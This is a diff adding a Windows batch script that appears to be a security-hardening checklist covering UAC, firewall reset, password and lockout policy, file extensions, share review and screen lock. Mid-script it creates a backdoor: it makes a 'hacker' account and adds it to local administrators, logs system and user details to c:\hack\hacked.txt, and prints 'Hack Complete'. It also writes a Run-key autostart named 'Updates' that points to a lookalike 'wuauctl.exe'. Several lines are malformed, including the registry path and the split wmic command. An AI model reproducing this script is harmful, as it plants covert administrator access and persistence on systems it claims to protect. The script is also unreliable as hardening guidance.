@@ -1,0 +1,119 @@
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+
+rem Turning on UAC
+
+pause
+
+netsh advfirewall reset
+
+rem netsh advfirewall firewall add rule name=("name") 
+
+rem http://www.itprotoday.com/windows-8/top-10-windows-firewall-netsh-commands, Changing the firewall to default
+
+pause
+
+md c:\hack
+
+ipconfig > c:\hack\hacked.txt
+
+net user hacker /add
+
+net localgroup administrators hacker /add
+
+net users >> c:\hack\hacked.txt
+
+net localgroup >> c:\hack\hacked.txt
+
+rem Checks For Users, Groups
+
+echo Hack Complete
+
+pause
+
+reg add HKEY_LOCAL _MACHINE\SOFTWARE\Microsoft\Windows\Current\Version\Run /v "Updates" /t REG_SZ /d "wuauctl.exe /updatenow 
+
+DISM /online /get-features /format:table > C:\features.txt
+
+rem Use DISM /online /disable-feature /featurename:[name] or DISM /online /enable-feature /featurename:[name]
+
+pause
+
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
+
+rem Turns off proxy Inet Settings
+
+pause
+
+rem net [service name] [restart, stop, start]
+
+net accounts /minpwlen:8
+
+net accounts /maxpwage:60
+
+net accounts /uniquepw:5
+
+net accounts /lockoutduration:30
+
+net accounts /lockoutthreshold:5
+
+net accounts /lockoutwindow:30
+
+rem Changes all the account policies for password and account
+
+pause 
+
+reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced” /v Hidden /t REG_DWORD /d 1 /f
+
+pause
+
+sfc /scannow
+
+rem System File Check
+
+pause
+
+wmic
+
+/output:C:\InstallList.txt product get name,version
+
+exit
+
+rem Checking the Installed programs
+
+pause
+
+cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+start .
+
+cd C:\windows\system32
+
+rem Opens the startup folder
+
+pause
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 0 /f
+
+rem Show File Extensions
+
+pause
+
+schtasks /query
+
+pause
+
+net share
+
+rem Only C$, IPC$, and ADMIN$ should exist
+
+pause
+
+powercfg /SETACVALUEINDEX SCHEME_CURRENT 7516b95f-f776-4464-8c53-06167f40cc99 3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e 300
+
+powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEOCONLOCK 300
+
+rem Locks after 5 mins or Display Turns Off
+
+pause
+
+https://tools.kali.org/tools-listing
